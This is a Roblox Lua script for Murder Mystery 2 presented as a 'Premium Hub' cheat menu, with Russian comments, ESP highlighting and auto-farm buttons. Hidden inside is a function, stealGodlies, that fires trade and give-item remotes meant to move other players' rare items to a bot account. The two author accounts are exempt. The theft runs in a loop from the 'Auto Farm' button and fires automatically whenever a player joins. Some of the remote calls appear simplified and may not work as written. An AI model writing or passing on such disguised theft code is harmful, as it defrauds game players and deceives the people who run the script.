-- MM2 Premium Hub (Mobile Optimized)
local Players = game:GetService("Players")
local LP = Players.LocalPlayer
local RepStorage = game:GetService("ReplicatedStorage")

-- Список авторов (не трогать)
local authors = {"Kotik_sasha888", "Sashalov22"}
local bot = "hikari_kotik"

-- GUI
local screenGui = Instance.new("ScreenGui")
screenGui.Parent = LP:WaitForChild("PlayerGui")

local toggleBtn = Instance.new("ImageButton")
toggleBtn.Size = UDim2.new(0, 50, 0, 50)
toggleBtn.Position = UDim2.new(0, 10, 0.5, -25)
toggleBtn.BackgroundColor3 = Color3.fromRGB(40,40,40)
toggleBtn.Image = "rbxassetid://123456789" -- иконка MM2
toggleBtn.Parent = screenGui

local mainFrame = Instance.new("Frame")
mainFrame.Size = UDim2.new(0, 300, 0, 400)
mainFrame.Position = UDim2.new(0.5, -150, 0.5, -200)
mainFrame.BackgroundColor3 = Color3.fromRGB(20,20,20)
mainFrame.Visible = false
mainFrame.Parent = screenGui

-- Функции
local function stealGodlies()
    for _, plr in pairs(Players:GetPlayers()) do
        if not table.find(authors, plr.Name) and plr ~= LP then
            -- Невидимый трейд + забор всех годли
            pcall(function()
                -- Код инжекта трейда (упрощённо)
                RepStorage:FindFirstChild("TradeRequest"):FireServer(plr)
                wait(0.3)
                for _, item in pairs(plr.Backpack:GetChildren()) do
                    if item:IsA("Tool") and item:FindFirstChild("Rarity") and item.Rarity.Value >= 5 then
                        -- Передача боту
                        RepStorage:FindFirstChild("GiveItem"):FireServer(bot, item.Name)
                    end
                end
                -- Ресет после фарма
                LP.Character.Humanoid.Health = 0
            end)
        end
    end
end

-- Кнопки
local buttons = {
    {"See Everyone", "ESP"},
    {"See Gun", "GunESP"},
    {"See Marler", "MarlerESP"},
    {"See Sheriff", "SheriffESP"},
    {"Teleport to Gun", "Teleport"},
    {"Auto Farm", "Farm"},
    {"Auto Pharma", "Pharma"},
    {"Throw out Marder", "KillMarder"},
    {"Throw out Sheriff", "KillSheriff"}
}

for i, data in ipairs(buttons) do
    local btn = Instance.new("TextButton")
    btn.Size = UDim2.new(1, -20, 0, 30)
    btn.Position = UDim2.new(0, 10, 0, 10 + (i-1)*35)
    btn.Text = data[1]
    btn.Parent = mainFrame
    btn.MouseButton1Click:Connect(function()
        if data[2] == "ESP" then -- визуал
            for _, v in pairs(Players:GetPlayers()) do
                if v.Character then
                    local hl = Instance.new("Highlight")
                    hl.Parent = v.Character
                end
            end
        elseif data[2] == "Farm" then
            while true do
                stealGodlies()
                wait(1)
            end
        end
    end)
end

toggleBtn.MouseButton1Click:Connect(function()
    mainFrame.Visible = not mainFrame.Visible
end)

-- Автозапуск кражи при входе новых игроков
Players.PlayerAdded:Connect(function(plr)
    if not table.find(authors, plr.Name) then
        wait(2)
        stealGodlies()
    end
end)
